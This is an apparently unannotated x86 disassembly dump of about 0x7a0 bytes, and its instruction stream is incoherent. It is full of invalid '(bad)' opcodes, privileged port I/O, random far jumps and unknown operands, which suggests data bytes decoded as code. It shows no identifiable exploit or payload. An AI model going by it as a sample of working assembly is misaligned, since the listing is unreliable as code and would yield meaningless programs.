  429aff:	add    BYTE PTR [esi],0x23
  429b02:	add    edi,DWORD PTR es:[eax-0x7c]
  429b06:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  429b08:	mov    ebx,0x209ce198
  429b0d:	ret    0xf833
  429b10:	call   0x1c538f1a
  429b15:	in     eax,0xb8
  429b17:	pop    esp
  429b18:	xchg   ecx,eax
  429b19:	int3   
  429b1a:	pusha  
  429b1b:	sub    ecx,DWORD PTR gs:0xebf6ed13
  429b22:	mov    dl,ah
  429b24:	mov    ?,WORD PTR [edi-0xc]
  429b27:	sub    BYTE PTR [ecx-0x6d],dh
  429b2a:	cmp    esi,DWORD PTR [ebp-0x78]
  429b2d:	mov    cl,0x9f
  429b2f:	sbb    eax,0x98e0d06e
  429b34:	fcom   QWORD PTR [ebx]
  429b36:	jo     0x429b3f
  429b38:	cmp    BYTE PTR [edi],dh
  429b3a:	pop    ds
  429b3b:	int    0xe3
  429b3d:	pop    esi
  429b3e:	cmp    ecx,DWORD PTR [edi-0x77]
  429b41:	add    ebp,DWORD PTR [edi+0x7a]
  429b44:	pop    ecx
  429b45:	(bad)  
  429b46:	retf   0xfd4b
  429b49:	add    al,dh
  429b4b:	add    esi,0xb9bc1eac
  429b51:	push   ecx
  429b52:	pop    ds
  429b53:	rcr    DWORD PTR [edx],1
  429b55:	jecxz  0x429aff
  429b57:	in     al,0x5c
  429b59:	bound  ebp,QWORD PTR ds:0xddf1e0d4
  429b5f:	jnp    0x429baa
  429b61:	pop    ebx
  429b62:	pop    esp
  429b63:	(bad)  [ecx+0x1f28ebe3]
  429b69:	dec    ebx
  429b6a:	add    DWORD PTR [ecx],ecx
  429b6c:	or     BYTE PTR [ebx],al
  429b6e:	inc    esi
  429b6f:	mov    esi,0x2bc0aefc
  429b74:	fwait
  429b75:	mov    ecx,0x6fc74b6e
  429b7a:	repz pop ds
  429b7c:	mov    ebx,esi
  429b7e:	push   es
  429b7f:	stos   DWORD PTR es:[edi],eax
  429b80:	dec    esp
  429b81:	sub    eax,0x1e0e6856
  429b86:	pop    ds
  429b87:	mov    ?,WORD PTR [edx-0x3f]
  429b8a:	sbb    dl,cl
  429b8c:	mov    ch,ah
  429b8e:	rol    DWORD PTR [ebx+0x4a667e45],0xfa
  429b95:	add    eax,0xe089a7b6
  429b9a:	clc    
  429b9b:	sbb    esp,DWORD PTR [edx+0x64471ff2]
  429ba1:	rcl    dh,0xd1
  429ba4:	imul   BYTE PTR [eax-0x1d]
  429ba7:	aad    0x35
  429ba9:	xor    eax,0x3c855e3d
  429bae:	std    
  429baf:	outs   dx,BYTE PTR ds:[esi]
  429bb0:	mov    dl,0x7
  429bb2:	mov    ah,dh
  429bb4:	or     ecx,ecx
  429bb6:	and    BYTE PTR [ebp-0x2b16ec7a],0x7a
  429bbd:	ds enter 0x1612,0xef
  429bc2:	add    DWORD PTR [edx+0x37537589],edx
  429bc8:	cli    
  429bc9:	mov    al,ah
  429bcb:	sbb    al,0xc8
  429bcd:	sbb    BYTE PTR [esi+ebp*8],bh
  429bd0:	or     al,0x99
  429bd2:	in     al,0x55
  429bd4:	cmp    edx,DWORD PTR [ecx+0x666bf349]
  429bda:	push   ds
  429bdb:	rol    ebp,1
  429bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bde:	mov    bl,0x8
  429be0:	sub    al,0xf6
  429be2:	push   edx
  429be3:	aam    0x33
  429be5:	icebp  
  429be6:	add    ebx,DWORD PTR [ecx+0x77]
  429be9:	mov    ds:0xc1899e6d,al
  429bee:	and    eax,0x193880b7
  429bf3:	or     DWORD PTR ds:0x996caa24,edi
  429bf9:	cmp    al,0x5a
  429bfb:	aam    0xfe
  429bfd:	xchg   ebx,eax
  429bfe:	test   al,0xc2
  429c00:	or     dh,BYTE PTR [ecx+0x1f]
  429c03:	inc    ebp
  429c04:	sbb    BYTE PTR [eax-0x9e36615],dh
  429c0a:	xor    bh,dl
  429c0c:	dec    ecx
  429c0d:	dec    esp
  429c0e:	pop    esp
  429c0f:	(bad)  
  429c10:	aam    0x90
  429c12:	push   0x28
  429c14:	mov    BYTE PTR [ecx-0x3],bh
  429c17:	push   0x816665c6
  429c1c:	cmp    al,0xef
  429c1e:	cld    
  429c1f:	shr    BYTE PTR [ebx-0x46],1
  429c22:	push   ecx
  429c23:	and    BYTE PTR [edx],dh
  429c25:	mov    cl,0xe0
  429c27:	hlt    
  429c28:	(bad)  
  429c29:	lea    ebx,[ebx-0x5]
  429c2c:	push   eax
  429c2d:	add    DWORD PTR [esi],ebx
  429c2f:	aas    
  429c30:	mov    ah,0x2a
  429c32:	push   ds
  429c33:	dec    esp
  429c34:	pop    ss
  429c35:	sbb    eax,0x9acb7312
  429c3a:	dec    ecx
  429c3b:	mov    ds:0x2921cc9,al
  429c40:	sti    
  429c41:	xchg   ebp,eax
  429c42:	fs aad 0x9a
  429c45:	out    0x53,eax
  429c47:	stos   BYTE PTR es:[edi],al
  429c48:	test   al,0xd7
  429c4a:	stc    
  429c4b:	aad    0x33
  429c4d:	and    al,0xcf
  429c4f:	leave  
  429c50:	clc    
  429c51:	jo     0x429c59
  429c53:	cli    
  429c54:	mov    BYTE PTR ds:0xa4ac3871,ch
  429c5a:	das    
  429c5b:	xor    DWORD PTR [edx-0x3c28ee0e],eax
  429c61:	mov    ds:0x83854de,al
  429c66:	fist   DWORD PTR [ecx+eiz*2]
  429c69:	fwait
  429c6a:	pusha  
  429c6b:	gs std 
  429c6d:	jl     0x429cd0
  429c6f:	jmp    0x913b:0x9e7422e2
  429c76:	not    BYTE PTR [ebp-0x50]
  429c79:	(bad)  
  429c7a:	scas   al,BYTE PTR es:[edi]
  429c7b:	push   ss
  429c7c:	out    dx,al
  429c7d:	cmp    ebx,DWORD PTR [edi]
  429c7f:	stc    
  429c80:	push   ebx
  429c81:	pop    ebp
  429c82:	shr    DWORD PTR [ecx-0x28f904c8],0xff
  429c89:	push   ebp
  429c8a:	pop    esp
  429c8b:	cmc    
  429c8c:	and    BYTE PTR [ecx],dl
  429c8e:	mov    al,0x86
  429c90:	mov    dh,0x65
  429c92:	and    BYTE PTR [edi],0x79
  429c95:	add    esi,eax
  429c97:	cmp    esi,eax
  429c99:	xchg   ebp,eax
  429c9a:	cld    
  429c9b:	leave  
  429c9c:	mov    al,0x48
  429c9e:	les    ebx,FWORD PTR [edi-0x2d]
  429ca1:	add    bh,BYTE PTR [edi]
  429ca3:	dec    ebp
  429ca4:	fidivr WORD PTR [ecx+0x62]
  429ca7:	cmp    al,0x88
  429ca9:	stos   DWORD PTR es:[edi],eax
  429caa:	in     al,0x14
  429cac:	fwait
  429cad:	stos   BYTE PTR es:[edi],al
  429cae:	jmp    0x429cae
  429cb0:	xchg   edi,eax
  429cb1:	add    bh,BYTE PTR [edx+0x40]
  429cb4:	mov    ecx,0xae47e594
  429cb9:	lea    ebx,[edi]
  429cbb:	sbb    eax,0xf8fe3997
  429cc0:	out    0x16,al
  429cc2:	pop    esi
  429cc3:	aad    0x70
  429cc5:	jmp    0xa7eb:0x8ebda4bf
  429ccc:	(bad)  
  429ccd:	das    
  429cce:	loopne 0x429c72
  429cd0:	int    0x52
  429cd2:	adc    ch,0x4b
  429cd5:	inc    edx
  429cd6:	inc    esp
  429cd7:	ins    DWORD PTR es:[edi],dx
  429cd8:	retf   0xbc9a
  429cdb:	call   0x53cd:0x3cf02b40
  429ce2:	add    esi,DWORD PTR fs:[ebx]
  429ce5:	and    DWORD PTR [ebx-0x254a3fac],ebx
  429ceb:	int    0xec
  429ced:	add    cl,BYTE PTR [esi]
  429cef:	shl    DWORD PTR [eax-0x1fb32e5b],0xc7
  429cf6:	xor    BYTE PTR [ebx-0x79],ah
  429cf9:	stos   DWORD PTR es:[edi],eax
  429cfa:	jo     0x429cb5
  429cfc:	pop    esp
  429cfd:	aad    0x80
  429cff:	xchg   DWORD PTR ss:[ebp+0x5b],eax
  429d03:	(bad)  [eax+0x63]
  429d06:	and    esp,edx
  429d08:	ror    DWORD PTR [esi-0x3e0d8574],0x8d
  429d0f:	repz jo 0x429d25
  429d12:	pop    ds
  429d13:	jmp    0x31e82510
  429d18:	out    0x9e,al
  429d1a:	mov    cl,0xd7
  429d1c:	xchg   esi,eax
  429d1d:	out    dx,al
  429d1e:	inc    ecx
  429d1f:	jno    0x429cd7
  429d21:	(bad)  
  429d22:	into   
  429d23:	fnstsw WORD PTR [ebx-0x2576e0d8]
  429d29:	call   0x302d300f
  429d2e:	es stos BYTE PTR es:[edi],al
  429d30:	test   BYTE PTR [edi-0x5a060e51],ah
  429d36:	adc    al,0xf
  429d38:	in     al,dx
  429d39:	push   0xffffffff
  429d3b:	mov    ebx,0xf51f68f6
  429d40:	jb     0x429d34
  429d42:	test   al,0xb5
  429d44:	xor    al,BYTE PTR [eax-0x60c928c5]
  429d4a:	test   eax,0x958d3fc1
  429d4f:	push   0x5b
  429d51:	xor    DWORD PTR [edx],0x1f
  429d54:	mov    BYTE PTR [ebx+0x687e27c2],cl
  429d5a:	jmp    0x195:0xd0030b07
  429d61:	imul   edi,DWORD PTR [ecx-0x4d],0xb1f17f6
  429d68:	cdq    
  429d69:	jns    0x429cfc
  429d6b:	push   ecx
  429d6c:	rcr    BYTE PTR fs:[edi+edx*8],cl
  429d70:	ror    DWORD PTR [ebx],0x2f
  429d73:	dec    eax
  429d74:	adc    bl,BYTE PTR [esi+0x188be3a]
  429d7a:	(bad)  
  429d7b:	xor    ch,BYTE PTR [ecx]
  429d7d:	hlt    
  429d7e:	imul   edi,DWORD PTR [ebp+0x7e658405],0x2e6acd88
  429d88:	hlt    
  429d89:	dec    esp
  429d8a:	sbb    al,0x5c
  429d8c:	mov    cl,ah
  429d8e:	paddusw mm6,QWORD PTR [edx+ebp*2+0x29a96eaa]
  429d96:	inc    edx
  429d97:	sub    DWORD PTR [edx+0x6639b6b4],esp
  429d9d:	add    ebp,DWORD PTR [edx-0x7c]
  429da0:	aam    0xb5
  429da2:	test   al,0xd4
  429da4:	dec    esi
  429da5:	xor    eax,0xdbc2acfe
  429daa:	jnp    0x429e2b
  429dac:	mov    ah,BYTE PTR [ebp+0x73fe0b33]
  429db2:	jo     0x429dba
  429db4:	jmp    0x21062c48
  429db9:	loopne 0x429dbc
  429dbb:	xlat   BYTE PTR ds:[ebx]
  429dbc:	xor    DWORD PTR [eax-0x46],ecx
  429dbf:	mov    ah,0x82
  429dc1:	mov    bl,0x57
  429dc3:	cmp    eax,0xbaa9df89
  429dc8:	jmp    0x687ba212
  429dcd:	loope  0x429dbe
  429dcf:	aam    0x25
  429dd1:	pop    edx
  429dd2:	adc    dh,BYTE PTR [ecx-0x2b385d5f]
  429dd8:	xor    dl,al
  429dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ddb:	aad    0x4d
  429ddd:	enter  0x63c1,0x51
  429de1:	fld    QWORD PTR [esi+0x5941415b]
  429de7:	pushf  
  429de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429de9:	test   DWORD PTR [ebp-0x51],edx
  429dec:	in     eax,dx
  429ded:	lods   al,BYTE PTR ds:[esi]
  429dee:	(bad)  
  429def:	ja     0x429ded
  429df1:	pop    ebp
  429df2:	ret    
  429df3:	xlat   BYTE PTR ds:[ebx]
  429df4:	mov    ebp,0xabe77bcb
  429df9:	dec    edx
  429dfa:	sahf   
  429dfb:	sbb    al,0x17
  429dfd:	add    ebp,esi
  429dff:	in     al,dx
  429e00:	and    ebx,0xe9ccaada
  429e06:	dec    esi
  429e07:	iret   
  429e08:	jge    0x429e3d
  429e0a:	ins    BYTE PTR es:[edi],dx
  429e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e0c:	mov    al,0x29
  429e0e:	aas    
  429e0f:	mov    dh,BYTE PTR [esi-0x6e]
  429e12:	mov    dl,ah
  429e14:	xchg   ecx,eax
  429e15:	pop    ecx
  429e16:	mov    esi,0x3d3686c
  429e1b:	pop    ebx
  429e1c:	mov    BYTE PTR [ecx-0x25],cl
  429e1f:	in     eax,dx
  429e20:	sub    DWORD PTR [esi],ecx
  429e22:	(bad)  
  429e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e24:	lods   al,BYTE PTR ds:[esi]
  429e25:	add    eax,0x48c00208
  429e2a:	loop   0x429e80
  429e2c:	ret    
  429e2d:	sbb    ebx,DWORD PTR [esi]
  429e2f:	in     eax,0xa3
  429e31:	rcl    BYTE PTR [ebx+0x174b1842],0xd4
  429e38:	imul   ecx,DWORD PTR [eax-0x72a5a32b],0xffffffe2
  429e3f:	shl    DWORD PTR [eax-0x75a34401],0x36
  429e46:	les    edx,FWORD PTR [eax+ebx*2]
  429e49:	xor    BYTE PTR [esi-0x79],bl
  429e4c:	jne    0x429e74
  429e4e:	ins    BYTE PTR es:[edi],dx
  429e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e50:	mov    esi,0x6d8a9fef
  429e55:	or     al,0x47
  429e57:	call   0x96fd:0x786f91
  429e5e:	or     DWORD PTR [edx],eax
  429e60:	clc    
  429e61:	inc    edx
  429e62:	inc    edi
  429e63:	xlat   BYTE PTR ds:[ebx]
  429e64:	mov    ?,edi
  429e66:	leave  
  429e67:	xor    DWORD PTR [edx+ecx*2-0x79632bb1],esi
  429e6e:	and    eax,0x329b610b
  429e73:	sar    DWORD PTR [eax-0x642afc5c],1
  429e79:	xor    edi,DWORD PTR [edx+0x32]
  429e7c:	out    dx,eax
  429e7d:	add    bl,BYTE PTR [esi]
  429e7f:	das    
  429e80:	mov    dl,0xcd
  429e82:	dec    ecx
  429e83:	aad    0x48
  429e85:	mov    cl,0xad
  429e87:	and    DWORD PTR ds:0x88ee0cd5,eax
  429e8d:	xchg   DWORD PTR [eax+0x704e1eaa],esi
  429e93:	data16 jp 0x429e99
  429e96:	(bad)  
  429e97:	pop    esp
  429e98:	push   es
  429e99:	ds xchg esp,eax
  429e9b:	lods   al,BYTE PTR ds:[esi]
  429e9c:	pushf  
  429e9d:	xchg   edi,eax
  429e9e:	pusha  
  429e9f:	fnstenv [esi+0x1497bc96]
  429ea5:	(bad)  
  429ea6:	(bad)  
  429ea7:	aam    0x13
  429ea9:	pop    ebp
  429eaa:	inc    eax
  429eab:	or     edi,ebx
  429ead:	mov    eax,ds:0x6789a11d
  429eb2:	xor    ecx,eax
  429eb4:	cdq    
  429eb5:	arpl   WORD PTR [ebx],cx
  429eb7:	test   eax,0xcc0e059f
  429ebc:	out    dx,al
  429ebd:	loop   0x429ec7
  429ebf:	xchg   ebp,eax
  429ec0:	sub    DWORD PTR [edi-0xe49dbf2],eax
  429ec6:	or     DWORD PTR [ebx+0x7ea50588],eax
  429ecc:	(bad)  
  429ecd:	pop    ds
  429ece:	lock xlat BYTE PTR ds:[ebx]
  429ed0:	sub    esi,DWORD PTR ds:[ebx+0x4f]
  429ed4:	sub    dh,BYTE PTR [ecx-0x5f07fc48]
  429eda:	ins    DWORD PTR es:[edi],dx
  429edb:	inc    ebp
  429edc:	mov    DWORD PTR [edi+0x757050ee],ebx
  429ee2:	sub    eax,0x660311f0
  429ee7:	(bad)  
  429ee8:	clc    
  429ee9:	mov    DWORD PTR [ebp+0x22],esi
  429eec:	sub    esi,DWORD PTR [ecx+0x64]
  429eef:	imul   ebp,DWORD PTR [ebx-0x38],0x2b
  429ef3:	mov    eax,ds:0xca28f3f1
  429ef8:	or     BYTE PTR ds:0x6161d5b4,cl
  429efe:	movhpd xmm5,QWORD PTR [esi]
  429f02:	dec    ebp
  429f03:	scas   al,BYTE PTR es:[edi]
  429f04:	mov    BYTE PTR [ecx],al
  429f06:	jmp    0x429e91
  429f08:	in     eax,0x85
  429f0a:	lock inc eax
  429f0c:	aad    0x2
  429f0e:	rcl    BYTE PTR [edx+0x2dd6547],cl
  429f14:	inc    esp
  429f15:	loop   0x429f81
  429f17:	shl    DWORD PTR [edx],cl
  429f19:	in     al,0xa
  429f1b:	jmp    0x429f27
  429f1d:	inc    ebx
  429f1e:	iret   
  429f1f:	xchg   edx,eax
  429f20:	imul   ebx,DWORD PTR [esi],0x37
  429f23:	outs   dx,DWORD PTR ds:[esi]
  429f24:	inc    edi
  429f25:	test   DWORD PTR [ecx+0x1b],eax
  429f28:	mov    DWORD PTR [edi],eax
  429f2a:	push   eax
  429f2b:	lods   eax,DWORD PTR ds:[esi]
  429f2c:	or     dh,BYTE PTR [ebp+edx*8-0x202002b1]
  429f33:	inc    ebx
  429f34:	xchg   edi,eax
  429f35:	xchg   DWORD PTR [ecx-0x2b],ebx
  429f38:	out    dx,eax
  429f39:	into   
  429f3a:	push   esi
  429f3b:	mov    ch,0xe0
  429f3d:	ret    
  429f3e:	adc    ebp,0xfffffff2
  429f41:	xor    ebp,DWORD PTR [edi+ebp*8-0x61]
  429f45:	std    
  429f46:	dec    ebx
  429f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f48:	mov    cl,0x43
  429f4a:	jnp    0x429ede
  429f4c:	mov    BYTE PTR [ebp+0x310588c7],bh
  429f52:	cmp    DWORD PTR [ecx*2-0x77ac6ab3],ebx
  429f59:	(bad)
  429f5c:	xlat   BYTE PTR ds:[ebx]
  429f5d:	mov    al,0x65
  429f5f:	test   al,0xc1
  429f61:	test   eax,0x5186cfae
  429f66:	nop
  429f67:	inc    edx
  429f68:	push   0xb5bceff6
  429f6d:	add    cl,al
  429f6f:	inc    ebx
  429f70:	imul   ebp,ebx,0xffffffc4
  429f73:	es fincstp 
  429f76:	pusha  
  429f77:	icebp  
  429f78:	adc    al,0x4a
  429f7a:	int3   
  429f7b:	rol    DWORD PTR [ebp-0x759756a0],cl
  429f81:	out    dx,al
  429f82:	dec    ebx
  429f83:	aad    0x34
  429f85:	call   0x3e8f:0x86a18139
  429f8c:	cmp    DWORD PTR [ebp+0x51],0xbcabc8a8
  429f93:	aam    0xd3
  429f95:	adc    DWORD PTR [ebx],ecx
  429f97:	or     esp,DWORD PTR [edx-0x57]
  429f9a:	dec    edi
  429f9b:	jo     0x429f25
  429f9d:	jmp    esi
  429f9f:	and    cl,BYTE PTR [ecx+eax*1]
  429fa2:	out    dx,al
  429fa3:	mov    esi,0x408c05cc
  429fa8:	add    ah,BYTE PTR [ecx]
  429faa:	mov    DWORD PTR [eax+0x3a],esi
  429fad:	adc    al,0x66
  429faf:	out    0xb6,eax
  429fb1:	sbb    edx,DWORD PTR [edx-0x74]
  429fb4:	mov    al,bh
  429fb6:	mov    esp,0xbf0e4ae9
  429fbb:	aam    0xc8
  429fbd:	mov    ebx,0xc71de55c
  429fc2:	sti    
  429fc3:	adc    eax,0x2c36338f
  429fc8:	mov    esi,0x5c54f7db
  429fcd:	std    
  429fce:	loopne 0x429fa4
  429fd0:	push   edi
  429fd1:	xchg   ecx,eax
  429fd2:	jb     0x429f89
  429fd4:	sbb    eax,0x1151481c
  429fd9:	repnz inc ecx
  429fdb:	(bad)  
  429fdc:	mov    ebx,esp
  429fde:	dec    eax
  429fdf:	add    dl,BYTE PTR [ecx-0x55]
  429fe2:	imul   esi,DWORD PTR [edi+0x6b],0x0
  429fe6:	xchg   esp,eax
  429fe7:	pop    ds
  429fe8:	imul   esi,DWORD PTR [edx-0x24b772e5],0xe58b414e
  429ff2:	xchg   edx,eax
  429ff3:	adc    DWORD PTR [edi+0x4f],ebp
  429ff6:	cdq    
  429ff7:	pop    edx
  429ff8:	push   eax
  429ff9:	pop    ebp
  429ffa:	aaa    
  429ffb:	aam    0x8
  429ffd:	addr16 mov esp,0x7733f49a
  42a003:	mov    ds:0xc14ae788,al
  42a008:	pop    ss
  42a009:	arpl   WORD PTR [esi-0x3ddbe82c],ax
  42a00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a010:	sbb    DWORD PTR [edi-0x61],ebx
  42a013:	scas   al,BYTE PTR es:[edi]
  42a014:	ret    0x10bf
  42a017:	push   cs
  42a018:	xchg   ebx,eax
  42a01a:	push   es
  42a01b:	pop    ecx
  42a01c:	inc    ecx
  42a01d:	scas   al,BYTE PTR es:[edi]
  42a01e:	in     eax,0xba
  42a020:	outs   dx,BYTE PTR ds:[esi]
  42a021:	bound  edx,QWORD PTR [ebx-0x19]
  42a024:	mov    cl,0x2
  42a026:	jbe    0x42a0a1
  42a028:	jge    0x42a01c
  42a02a:	sub    dh,0x72
  42a02d:	lock pop ds
  42a02f:	pop    ss
  42a030:	and    eax,0xb4f07ef5
  42a035:	ficom  WORD PTR [ecx-0x2b]
  42a038:	js     0x42a022
  42a03a:	aam    0xe5
  42a03c:	cs aas 
  42a03e:	inc    edx
  42a03f:	mov    al,ds:0x3281178b
  42a044:	xchg   edx,eax
  42a045:	jne    0x42a03c
  42a047:	xor    DWORD PTR [ecx+0x45],0xffffffe0
  42a04b:	push   0xd4df68bc
  42a050:	dec    esi
  42a051:	push   ebp
  42a052:	out    dx,al
  42a053:	fsubr  DWORD PTR [edi+edx*2]
  42a056:	jno    0x42a049
  42a058:	sbb    al,0x86
  42a05a:	inc    edi
  42a05b:	aam    0xa5
  42a05d:	jecxz  0x42a056
  42a05f:	push   ss
  42a060:	mov    edx,0xf8fcfe02
  42a065:	das    
  42a066:	ret    
  42a067:	jmp    0x42a06b
  42a069:	lea    esp,[eax+0x29]
  42a06c:	xlat   BYTE PTR ds:[ebx]
  42a06d:	adc    edx,edi
  42a06f:	xor    bh,BYTE PTR [eax-0x512a8e30]
  42a075:	cmp    ch,BYTE PTR [edx+0x41158c0a]
  42a07b:	push   ecx
  42a07c:	mov    BYTE PTR [ebp-0x20],bl
  42a07f:	jl     0x42a015
  42a081:	out    dx,al
  42a082:	test   eax,0xa3fc8841
  42a087:	aam    0xd5
  42a089:	pop    ss
  42a08a:	jg     0x42a0c6
  42a08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a08d:	inc    esp
  42a08e:	cmp    esp,DWORD PTR [ebp-0x47]
  42a091:	jb     0x42a0b1
  42a093:	dec    ebx
  42a094:	sub    edx,DWORD PTR [ebx-0x34c5ebdc]
  42a09a:	jno    0x42a03a
  42a09c:	out    dx,ax
  42a09e:	imul   edx,DWORD PTR [ebp+0x6c],0x3ddcb8a9
  42a0a5:	fstp   QWORD PTR [edi]
  42a0a7:	push   edi
  42a0a8:	fsubr  DWORD PTR [ecx+0x2665b460]
  42a0ae:	adc    ebx,DWORD PTR [edx-0x69]
  42a0b1:	retf   0x616d
  42a0b4:	loope  0x42a050
  42a0b6:	ficom  WORD PTR [edi-0x13c92216]
  42a0bc:	and    esp,DWORD PTR [esi+0x60]
  42a0bf:	mov    DWORD PTR [ecx-0x16fbb6ee],ecx
  42a0c5:	and    ebx,DWORD PTR [edi+0x2d]
  42a0c8:	add    ebp,DWORD PTR ds:[esi+0x639dd321]
  42a0cf:	leave  
  42a0d0:	jnp    0x42a0ef
  42a0d2:	pop    ds
  42a0d3:	in     eax,0xf8
  42a0d5:	inc    esp
  42a0d6:	or     BYTE PTR [edi-0x2b144a98],0xe0
  42a0dd:	mov    al,0x8a
  42a0df:	js     0x42a0fe
  42a0e1:	sub    DWORD PTR [eax],0x473f880c
  42a0e7:	scas   al,BYTE PTR es:[edi]
  42a0e8:	ins    DWORD PTR es:[edi],dx
  42a0e9:	mov    edx,DWORD PTR [edx]
  42a0eb:	jmp    0xe4c0:0xd039f726
  42a0f2:	jo     0x42a0cc
  42a0f4:	pop    edi
  42a0f5:	mov    dh,0xe3
  42a0f7:	loop   0x42a081
  42a0f9:	arpl   WORD PTR [edi],bp
  42a0fb:	ret    
  42a0fc:	addr16 jbe 0x42a11d
  42a0ff:	rcl    DWORD PTR [edx+eax*8-0x64b9125f],0x98
  42a107:	shr    DWORD PTR [esp+ebp*1],1
  42a10a:	mov    BYTE PTR ds:0x39e0fb8d,0x64
  42a111:	arpl   WORD PTR fs:[ecx-0x3d],ax
  42a115:	lods   al,BYTE PTR ds:[esi]
  42a116:	jne    0x42a154
  42a118:	fadd   st,st(2)
  42a11a:	xor    bl,BYTE PTR [ebx+esi*8-0x2b107ffe]
  42a121:	inc    ecx
  42a122:	sbb    eax,0x60bbfa8b
  42a127:	mov    ebx,DWORD PTR [esi]
  42a129:	imul   edi,DWORD PTR [edx],0xf058a447
  42a12f:	aad    0xe9
  42a131:	push   eax
  42a132:	push   eax
  42a133:	cmp    al,BYTE PTR [edi+ebx*2-0x7077d863]
  42a13a:	sbb    eax,0x56d2c607
  42a13f:	and    esp,DWORD PTR [esi+0x20d21a03]
  42a145:	mov    cl,0xa3
  42a147:	nop
  42a148:	push   ebp
  42a149:	cmp    BYTE PTR [edi+0x64],0xc5
  42a14d:	dec    esp
  42a14e:	das    
  42a14f:	popa   
  42a150:	mov    bl,dl
  42a152:	lea    eax,[esi]
  42a154:	cmp    eax,0x535ab65a
  42a159:	add    ebp,DWORD PTR [esi]
  42a15b:	push   esi
  42a15c:	xchg   esp,eax
  42a15d:	repz repnz xlat BYTE PTR ds:[ebx]
  42a160:	mov    ch,0xf1
  42a162:	ins    DWORD PTR es:[edi],dx
  42a163:	leave  
  42a164:	or     BYTE PTR [edi],dl
  42a166:	pushf  
  42a167:	fsubr  DWORD PTR [ecx]
  42a169:	sbb    eax,0x2609d4f
  42a16e:	push   esi
  42a16f:	mov    ebp,DWORD PTR [ecx-0x3f]
  42a172:	neg    esi
  42a174:	dec    edx
  42a175:	push   ebx
  42a176:	sub    cl,BYTE PTR [ebx-0x77]
  42a179:	and    DWORD PTR [ebp+0x3d31204c],edi
  42a17f:	dec    esi
  42a180:	ret    
  42a181:	mov    cl,BYTE PTR [ebp+0x59]
  42a184:	jno    0x42a188
  42a186:	call   0x9293:0x7395d3ae
  42a18d:	dec    esi
  42a18e:	xchg   ebx,eax
  42a18f:	xor    eax,0x13db023e
  42a194:	mov    cs,WORD PTR [esp+ebx*4-0x6fb97397]
  42a19b:	cmp    eax,0xef1f86a9
  42a1a0:	mov    edx,0x631a9cd6
  42a1a5:	cli    
  42a1a6:	pop    ds
  42a1a7:	push   edi
  42a1a8:	das    
  42a1a9:	cmc    
  42a1aa:	jb     0x42a164
  42a1ac:	in     al,0x8f
  42a1ae:	sbb    eax,0x9c18b7d4
  42a1b3:	push   ebp
  42a1b4:	mov    edi,0x89a4a7e7
  42a1b9:	inc    ecx
  42a1ba:	and    DWORD PTR [edx],ebx
  42a1bc:	fbld   TBYTE PTR [ebx]
  42a1be:	push   0xce1bee9e
  42a1c3:	push   cs
  42a1c4:	xchg   ebp,eax
  42a1c5:	or     bl,BYTE PTR [eax-0x4f62b]
  42a1cb:	xchg   ebp,eax
  42a1cc:	cmp    al,bh
  42a1ce:	pop    edi
  42a1cf:	mov    ds:0xd4d5e5c3,al
  42a1d4:	jne    0x42a15e
  42a1d6:	repz jnp 0x42a1aa
  42a1d9:	add    eax,0xbe3ee558
  42a1de:	mov    edx,0x4e411d14
  42a1e3:	cld    
  42a1e4:	mov    BYTE PTR [edi-0x39],dl
  42a1e7:	sti    
  42a1e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1e9:	and    bh,dl
  42a1eb:	out    0x4c,eax
  42a1ed:	sbb    eax,0x8d2ca046
  42a1f2:	int    0xca
  42a1f4:	fistp  WORD PTR [eax-0x78895b40]
  42a1fa:	sahf   
  42a1fb:	dec    ebx
  42a1fc:	dec    ebx
  42a1fd:	sbb    dh,BYTE PTR [eax+0x60f6781b]
  42a203:	add    BYTE PTR ds:0xd7dec457,bl
  42a209:	sbb    eax,0x93f841fa
  42a20e:	rcl    DWORD PTR [edx+eiz*1+0x47],1
  42a212:	imul   edi,DWORD PTR [edi+0x76],0xbf211fd0
  42a219:	push   edi
  42a21a:	mul    BYTE PTR [eax]
  42a21c:	xchg   edx,eax
  42a21d:	cdq    
  42a21e:	arpl   WORD PTR [edx-0x4879c655],di
  42a224:	mov    BYTE PTR [ecx+ecx*4-0x19],ah
  42a228:	jns    0x42a2a5
  42a22a:	pop    ds
  42a22b:	xchg   ebp,eax
  42a22c:	mov    BYTE PTR [edx-0x4a],bl
  42a22f:	push   DWORD PTR [esi+ebx*2-0x318c2bf3]
  42a236:	in     eax,0xa1
  42a238:	sub    BYTE PTR [esi],0x4c
  42a23b:	xchg   esi,eax
  42a23c:	xchg   edi,eax
  42a23d:	sbb    eax,0x420d4198
  42a242:	icebp  
  42a243:	mov    ss,WORD PTR [edx]
  42a245:	shl    ch,0xd4
  42a248:	dec    edx
  42a249:	pop    ss
  42a24a:	out    0x31,al
  42a24c:	pushf  
  42a24d:	sbb    cl,BYTE PTR [ebx]
  42a24f:	out    0x88,al
  42a251:	pcmpgtd mm3,QWORD PTR [edi-0x1414eff8]
  42a258:	or     al,BYTE PTR [ebx]
  42a25a:	call   0xd9e2:0x776e2a26
  42a261:	in     al,dx
  42a262:	ins    DWORD PTR es:[edi],dx
  42a263:	mov    ds:0xc80e9be4,eax
  42a268:	push   0x6f120fca
  42a26d:	add    ebp,DWORD PTR [eax]
  42a26f:	daa    
  42a270:	jo     0x42a28b
  42a272:	xchg   ebp,eax
  42a273:	adc    al,0xad
  42a275:	dec    esp
  42a276:	sub    esi,ecx
  42a278:	mov    BYTE PTR ds:0xf498525e,dl
  42a27e:	mov    bl,BYTE PTR [edx]
  42a280:	mov    bh,0x10
  42a282:	mov    WORD PTR [ecx+0x45],?
  42a285:	add    BYTE PTR [esi],bl
  42a287:	mov    al,ds:0xf98a7d2
  42a28c:	mov    BYTE PTR [ebp-0x26c33245],bl
  42a292:	adc    dl,BYTE PTR [ebp-0x28a80ad4]
  42a298:	call   0x1bf424a3
  42a29d:	sub    DWORD PTR [eax],0xfffffff7
  42a2a0:	mov    eax,ds:0x885d0746
